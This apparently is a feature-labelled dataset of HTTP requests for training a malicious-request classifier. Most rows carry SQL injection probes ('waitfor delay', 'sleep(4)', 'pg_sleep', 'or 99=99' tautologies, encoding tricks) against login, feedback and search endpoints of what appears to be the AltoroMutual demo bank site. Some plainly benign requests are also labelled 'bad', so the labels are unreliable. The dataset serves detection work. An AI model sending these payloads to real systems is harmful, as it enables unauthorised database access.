method,body,path,single_q,double_q,dashes,braces,spaces,badwords,class
POST,b'btnSubmit=Subscribe%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&txtEmail=sample%40email.tst',b'/doSubscribe',2,1,1,0,5,2,bad
POST,b'cfile=comments.txt%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',3,0,1,0,7,2,bad
GET,b'',b'/high_yield_investments%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20.htm',2,1,1,0,5,2,bad
POST,b'btnSubmit=Login&passw=acUn3t1x&uid=1%c0%00xa7%c0%a2',b'/doLogin',0,0,0,0,0,1,bad
GET,b'',b'/survey_questions.jsp?step=b%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
POST,b'btnSubmit=Login%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&passw=acUn3t1x&uid=1',b'/doLogin',2,1,1,0,5,3,bad
POST,b'cfile=comments.txt&comments=1&email_addr=%40%40oaAzP&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
GET,b'',b'/search.jsp?query=1%27%3dsleep%284%29%3d%27',2,0,0,1,0,1,bad
GET,b'',b'/swagger/%5c.html',0,0,0,0,0,0,bad
GET,b'',b'/swagger/-1%27%20or%20%2749%27%3d%2749.html',4,0,0,0,2,0,bad
POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
POST,b'cfile=comments.txt%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,1,1,0,7,2,bad
GET,b'',b'/index.jsp?content=personal_loans.htm',0,0,0,0,0,0,bad
POST,b'btnSubmit=Login&passw=acUn3t1x&uid=%40%40lWExv',b'/doLogin',0,0,0,0,0,1,bad
GET,b'',b'/survey_questions.jsp?step=b%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,1,1,2,6,1,bad
GET,b'',b'/search.jsp?query=1%22%3dsleep%284%29%3d%22',0,2,0,1,0,1,bad
GET,b'',b'/swagger/1%c0%00xa7%c0%a2.html',0,0,0,0,0,0,bad
GET,b'',b'/swagger/-1%27%20or%20%2749%27%3d%270.html',4,0,0,0,2,0,bad
POST,b'cfile=comments.txt&comments=1&email_addr=JyI%3d&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,0,0,bad
POST,b'btnSubmit=Login&passw=acUn3t1x&uid=JyI%3d',b'/doLogin',0,0,0,0,0,1,bad
GET,b'',b'/survey_questions.jsp?step=b%27%3dsleep%284%29%3d%27',2,0,0,1,0,1,bad
GET,b'',b'/search.jsp?query=1%3bselect%20pg_sleep%284%29%3b%20--%20',0,0,1,1,3,2,bad
GET,b'',b'/swagger/-1%22%20or%20%2238%22%3d%2238.html',0,4,0,0,2,0,bad
GET,b'',b'/swagger/%40%404gjm0.html',0,0,0,0,0,0,bad
POST,b'btnSubmit=Subscribe&txtEmail=-1%20or%2099%3d99',b'/doSubscribe',0,0,0,0,2,0,bad
POST,b'cfile=comments.txt&comments=1&email_addr=%bf%27%bf%22&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,0,0,bad
GET,b'',b'/index.jsp?content=-1%20or%2050%3d50',0,0,0,0,2,0,bad
POST,b'btnSubmit=Login&passw=acUn3t1x&uid=%bf%27%bf%22',b'/doLogin',1,1,0,0,0,1,bad
GET,b'',b'/survey_questions.jsp?step=b%22%3dsleep%284%29%3d%22',0,2,0,1,0,1,bad
POST,b'btnSubmit=Login&passw=-1%20or%2071%3d71&uid=1',b'/doLogin',0,0,0,0,2,1,bad
GET,b'',b'/swagger/-1%22%20or%20%2238%22%3d%220.html',0,4,0,0,2,0,bad
GET,b'',b'/search.jsp?query=1%27%3bselect%20pg_sleep%284%29%3b%20--%20',1,0,1,1,3,2,bad
POST,b'btnSubmit=Subscribe&txtEmail=-1%20or%2099%3d0',b'/doSubscribe',0,0,0,0,2,0,bad
POST,b'cfile=comments.txt&comments=-1%20or%20108%3d108&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,4,0,bad
GET,b'',b'/swagger/JyI%3d.html',0,0,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=1&email_addr=%f0%27%27%f0%22%22&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',2,2,0,0,0,0,bad
GET,b'',b'/index.jsp?content=-1%20or%2050%3d0',0,0,0,0,2,0,bad
GET,b'',b'/survey_questions.jsp?step=b%20and%20sleep%284%29%20',0,0,0,1,3,1,bad
POST,b'btnSubmit=Login&passw=-1%20or%2071%3d0&uid=1',b'/doLogin',0,0,0,0,2,1,bad
POST,b'cfile=comments.txt&comments=-1%20or%20108%3d0&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,4,0,bad
POST,b'btnSubmit=Subscribe&txtEmail=-1%27%20or%20%2720%27%3d%2720',b'/doSubscribe',4,0,0,0,2,0,bad
GET,b'',b'/search.jsp?query=1%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',2,0,1,0,5,2,bad
GET,b'',b'/swagger/index%27%20and%20sleep%284%29%3d%27.html',2,0,0,1,2,1,bad
GET,b'',b'/swagger/%bf%27%bf%22.html',1,1,0,0,0,0,bad
GET,b'',b'/index.jsp?content=-1%20or%2050-48%20%3d%202',0,0,0,0,4,0,bad
POST,b'btnSubmit=Login&passw=acUn3t1x&uid=%f0%27%27%f0%22%22',b'/doLogin',2,2,0,0,0,1,bad
GET,b'',b'/survey_questions.jsp?step=b%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,0,1,2,6,1,bad
POST,b'cfile=comments.txt&comments=-1%27%20or%20%2797%27%3d%2797&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',4,0,0,0,4,0,bad
POST,b'btnSubmit=Login&passw=-1%27%20or%20%2719%27%3d%2719&uid=1',b'/doLogin',4,0,0,0,2,1,bad
POST,b'btnSubmit=Subscribe&txtEmail=-1%27%20or%20%2720%27%3d%270',b'/doSubscribe',4,0,0,0,2,0,bad
GET,b'',b'/swagger/%f0%27%27%f0%22%22.html',2,2,0,0,0,0,bad
GET,b'',b'/search.jsp?query=1%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',3,0,1,0,5,2,bad
GET,b'',b'/swagger/index%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20.html',1,0,1,2,6,1,bad
POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=1%27%22&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
GET,b'',b'/index.jsp?content=-1%27%20or%20%2720%27%3d%2720',4,0,0,0,2,0,bad
GET,b'',b'/index.jsp?content=business_other.htm',0,0,0,0,0,0,bad
GET,b'',b'/survey_questions.jsp?step=b%27%3bselect%20pg_sleep%284%29%3b%20--%20',1,0,1,1,3,2,bad
POST,b'cfile=comments.txt&comments=-1%27%20or%20%2797%27%3d%270&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',4,0,0,0,4,0,bad
POST,b'btnSubmit=Login&passw=-1%27%20or%20%2719%27%3d%270&uid=1',b'/doLogin',4,0,0,0,2,1,bad
POST,b'btnSubmit=Subscribe&txtEmail=-1%22%20or%20%2289%22%3d%2289',b'/doSubscribe',0,4,0,0,2,0,bad
GET,b'',b'/swagger/index%22%20and%20sleep%284%29%3d%22.html',0,2,0,1,2,1,bad
GET,b'',b'/search.jsp?query=1%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',2,1,1,0,5,2,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual',0,0,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=%5c&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
GET,b'',b'/index.jsp?content=-1%27%20or%20%2720%27%3d%270',4,0,0,0,2,0,bad
GET,b'',b'/index.jsp?content=1%27%22',1,1,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=-1%22%20or%20%2236%22%3d%2236&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,4,0,0,4,0,bad
GET,b'',b'/survey_questions.jsp?step=b%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',3,0,1,0,5,2,bad
POST,b'btnSubmit=Subscribe&txtEmail=-1%22%20or%20%2289%22%3d%220',b'/doSubscribe',0,4,0,0,2,0,bad
POST,b'btnSubmit=Login&passw=-1%27%20or%2019-17%20%3d%20%272&uid=1',b'/doLogin',2,0,0,0,4,1,bad
GET,b'',b'/swagger/index%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.html',1,0,1,2,6,1,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual',0,0,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=1%c0%00xa7%c0%a2&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
GET,b'',b'/index.jsp?content=-1%27%20or%2020-18%20%3d%20%272',2,0,0,0,4,0,bad
GET,b'',b'/index.jsp?content=%5c',0,0,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=-1%22%20or%20%2236%22%3d%220&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,4,0,0,4,0,bad
POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%20and%20sleep%284%29%3d%27',b'/doSubscribe',2,0,0,1,2,1,bad
GET,b'',b'/survey_questions.jsp?step=b%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',2,1,1,0,5,2,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%20or%2058%3d58',0,0,0,0,2,0,bad
POST,b'btnSubmit=Login&passw=-1%22%20or%20%2222%22%3d%2222&uid=1',b'/doLogin',0,4,0,0,2,1,bad
GET,b'',b'/swagger/index%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.html',0,1,1,2,6,1,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=1%27%22',1,1,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=%40%40lGkk0&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
GET,b'',b'/index.jsp?content=-1%22%20or%20%2225%22%3d%2225',0,4,0,0,2,0,bad
GET,b'',b'/index.jsp?content=1%c0%00xa7%c0%a2',0,0,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=1%20and%20sleep%284%29%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,1,5,1,bad
POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',b'/doSubscribe',1,0,1,2,6,1,bad
POST,b'btnSubmit=Login&passw=-1%22%20or%20%2222%22%3d%220&uid=1',b'/doLogin',0,4,0,0,2,1,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%20or%2058%3d0',0,0,0,0,2,0,bad
GET,b'',b'/default.jsp?content=security.htm',0,0,0,0,0,0,bad
GET,b'',b'/swagger/index%27%3dsleep%284%29%3d%27.html',2,0,0,1,0,1,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=%5c',0,0,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=JyI%3d&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
GET,b'',b'/index.jsp?content=%40%40ussS4',0,0,0,0,0,0,bad
GET,b'',b'/index.jsp?content=-1%22%20or%20%2225%22%3d%220',0,4,0,0,2,0,bad
POST,b'cfile=comments.txt&comments=1%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,1,2,8,1,bad
POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%22%20and%20sleep%284%29%3d%22',b'/doSubscribe',0,2,0,1,2,1,bad
POST,b'btnSubmit=Login&passw=acUn3t1x%27%20and%20sleep%284%29%3d%27&uid=1',b'/doLogin',2,0,0,1,2,2,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%20or%2058-56%20%3d%202',0,0,0,0,4,0,bad
GET,b'',b'/swagger/index%22%3dsleep%284%29%3d%22.html',0,2,0,1,0,1,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=1%c0%00xa7%c0%a2',0,0,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=%bf%27%bf%22&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
GET,b'',b'/index.jsp?content=JyI%3d',0,0,0,0,0,0,bad
GET,b'',b'/index.jsp?content=-1%22%20or%2025-23%20%3d%20%222',0,2,0,0,4,0,bad
POST,b'cfile=comments.txt&comments=1%27%20and%20sleep%284%29%3d%27&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,0,0,1,4,1,bad
POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',b'/doSubscribe',1,0,1,2,6,1,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%27%20or%20%2719%27%3d%2719',4,0,0,0,2,0,bad
GET,b'',b'/swagger/index%20and%20sleep%284%29%20.html',0,0,0,1,3,1,bad
POST,b'btnSubmit=Login&passw=acUn3t1x%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&uid=1',b'/doLogin',1,0,1,2,6,2,bad
GET,b'',b'/default.jsp?content=-1%20or%2032%3d32',0,0,0,0,2,0,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=%40%40VprZK',0,0,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=%f0%27%27%f0%22%22&subject=1&submit=Submit',b'/sendFeedback',2,2,0,0,2,0,bad
GET,b'',b'/index.jsp?content=%bf%27%bf%22',1,1,0,0,0,0,bad
GET,b'',b'/index.jsp?content=personal_loans.htm%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',b'/doSubscribe',0,1,1,2,6,1,bad
POST,b'cfile=comments.txt&comments=1%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,2,8,1,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%27%20or%20%2719%27%3d%270',4,0,0,0,2,0,bad
GET,b'',b'/swagger/index%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20.html',0,0,1,2,6,1,bad
GET,b'',b'/default.jsp?content=-1%20or%2032%3d0',0,0,0,0,2,0,bad
POST,b'btnSubmit=Login&passw=acUn3t1x%22%20and%20sleep%284%29%3d%22&uid=1',b'/doLogin',0,2,0,1,2,2,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=JyI%3d',0,0,0,0,0,0,bad
GET,b'',b'/index.jsp?content=%f0%27%27%f0%22%22',2,2,0,0,0,0,bad
GET,b'',b'/index.jsp?content=personal_loans.htm%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
POST,b'cfile=comments.txt&comments=1%22%20and%20sleep%284%29%3d%22&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,2,0,1,4,1,bad
POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%3dsleep%284%29%3d%27',b'/doSubscribe',2,0,0,1,0,1,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%27%20or%2019-17%20%3d%20%272',2,0,0,0,4,0,bad
GET,b'',b'/swagger/index%27%3bselect%20pg_sleep%284%29%3b%20--%20.html',1,0,1,1,3,2,bad
GET,b'',b'/default.jsp?content=-1%27%20or%20%2745%27%3d%2745',4,0,0,0,2,0,bad
POST,b'btnSubmit=Login&passw=acUn3t1x%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&uid=1',b'/doLogin',1,0,1,2,6,2,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=%bf%27%bf%22',1,1,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1%27%22&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
GET,b'',b'/index.jsp?content=personal_loans.htm%22%20and%20sleep%284%29%3d%22',0,2,0,1,2,1,bad
GET,b'',b'/default.jsp?content=security.htm',0,0,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=1%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,2,8,1,bad
POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%22%3dsleep%284%29%3d%22',b'/doSubscribe',0,2,0,1,0,1,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%22%20or%20%2283%22%3d%2283',0,4,0,0,2,0,bad
GET,b'',b'/swagger/index%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20.html',3,0,1,0,5,2,bad
POST,b'btnSubmit=Login&passw=acUn3t1x%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&uid=1',b'/doLogin',0,1,1,2,6,2,bad
GET,b'',b'/default.jsp?content=-1%27%20or%20%2745%27%3d%270',4,0,0,0,2,0,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=%f0%27%27%f0%22%22',2,2,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=%5c&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
GET,b'',b'/default.jsp?content=1%27%22',1,1,0,0,0,0,bad
GET,b'',b'/index.jsp?content=personal_loans.htm%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%20and%20sleep%284%29%20',b'/doSubscribe',0,0,0,1,3,1,bad
POST,b'cfile=comments.txt&comments=1%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,1,1,2,8,1,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%22%20or%20%2283%22%3d%220',0,4,0,0,2,0,bad
GET,b'',b'/swagger/index%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20.html',2,1,1,0,5,2,bad
POST,b'btnSubmit=Login&passw=acUn3t1x%27%3dsleep%284%29%3d%27&uid=1',b'/doLogin',2,0,0,1,0,2,bad
GET,b'',b'/default.jsp?content=-1%22%20or%20%2296%22%3d%2296',0,4,0,0,2,0,bad
GET,b'',b'/',0,0,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1%c0%00xa7%c0%a2&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
GET,b'',b'/index.jsp?content=personal_loans.htm%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',0,1,1,2,6,1,bad
POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20',b'/doSubscribe',0,0,1,2,6,1,bad
POST,b'cfile=comments.txt&comments=1%27%3dsleep%284%29%3d%27&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',2,0,0,1,2,1,bad
GET,b'',b'/',0,0,0,0,0,0,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=-1%22%20or%2083-81%20%3d%20%222',0,2,0,0,4,0,bad
GET,b'',b'/default.jsp?content=%5c',0,0,0,0,0,0,bad
POST,b'btnSubmit=Login&passw=acUn3t1x%22%3dsleep%284%29%3d%22&uid=1',b'/doLogin',0,2,0,1,0,2,bad
GET,b'',b'/default.jsp?content=-1%22%20or%20%2296%22%3d%220',0,4,0,0,2,0,bad
POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=%40%40uooCt&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
POST,b'cfile=comments.txt&comments=1%22%3dsleep%284%29%3d%22&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,2,0,1,2,1,bad
GET,b'',b'/index.jsp?content=personal_loans.htm%27%3dsleep%284%29%3d%27',2,0,0,1,0,1,bad
POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%3bselect%20pg_sleep%284%29%3b%20--%20',b'/doSubscribe',1,0,1,1,3,2,bad
GET,b'',b'/',0,0,0,0,0,0,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
GET,b'',b'/default.jsp?content=1%c0%00xa7%c0%a2',0,0,0,0,0,0,bad
POST,b'btnSubmit=Login&passw=acUn3t1x%20and%20sleep%284%29%20&uid=1',b'/doLogin',0,0,0,1,3,2,bad
GET,b'',b'/default.jsp?content=security.htm%27%20and%20sleep%284%29%3d%27',2,0,0,1,2,1,bad
GET,b'',b'/',0,0,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=1%3bselect%20pg_sleep%284%29%3b%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,1,1,5,2,bad
GET,b'',b'/index.jsp?content=personal_loans.htm%22%3dsleep%284%29%3d%22',0,2,0,1,0,1,bad
POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=JyI%3d&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',b'/doSubscribe',3,0,1,0,5,2,bad
GET,b'',b'/',0,0,0,0,0,0,bad
GET,b'',b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
GET,b'',b'/default.jsp?content=%40%40Va505',0,0,0,0,0,0,bad
POST,b'btnSubmit=Login&passw=acUn3t1x%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&uid=1',b'/doLogin',0,0,1,2,6,2,bad
GET,b'',b'/default.jsp?content=security.htm%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20',1,0,1,2,6,1,bad
GET,b'',b'/',0,0,0,0,0,0,bad
POST,b'cfile=comments.txt&comments=1%27%3bselect%20pg_sleep%284%29%3b%20--%20&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',1,0,1,1,5,2,bad
POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=%bf%27%bf%22&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
GET,b'',b'/index.jsp?content=personal_loans.htm%20and%20sleep%284%29%20',0,0,0,1,3,1,bad
POST,b'btnSubmit=Subscribe&txtEmail=sample%2540email.tst%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20',b'/doSubscribe',2,1,1,0,5,2,bad
